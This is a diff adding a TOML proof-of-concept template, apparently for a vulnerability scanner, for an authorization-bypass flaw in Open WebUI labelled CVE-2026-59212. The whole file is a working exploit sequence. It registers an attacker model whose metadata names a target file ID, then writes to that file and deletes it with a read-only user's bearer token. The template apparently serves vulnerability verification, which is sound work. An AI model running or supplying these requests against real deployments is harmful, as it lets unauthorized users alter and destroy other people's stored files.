@@ -1,0 +1,63 @@
+[info]
+author = "ave"
+description = "验证 Open WebUI 授权绕过漏洞：只读知识库用户通过将文件 ID 写入攻击者控制的模型元数据，可获得文件写入和删除权限"
+id = "POC-AVE-2026-0811"
+name = "CVE-2026-59212 PoC"
+severity = "medium"
+tags = ["ave-2026-0811"]
+vuln_id = [
+    "CVE-2026-59212",
+    "AVE-2026-0811",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/api/v1/models"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"name": "attacker-model", "meta": {"knowledge": [{"file_id": "{{target_file_id}}", "permission": "read"}]}}'
+type = "json"
+
+[poc.requests.headers]
+Authorization = "Bearer {{token}}"
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests]]
+method = "POST"
+path = "/api/v1/knowledge/files/{{target_file_id}}/write"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"content": "poc-write-test"}'
+type = "json"
+
+[poc.requests.headers]
+Authorization = "Bearer {{token}}"
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests]]
+method = "DELETE"
+path = "/api/v1/knowledge/files/{{target_file_id}}"
+protocol = "http"
+
+[poc.requests.headers]
+Authorization = "Bearer {{token}}"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
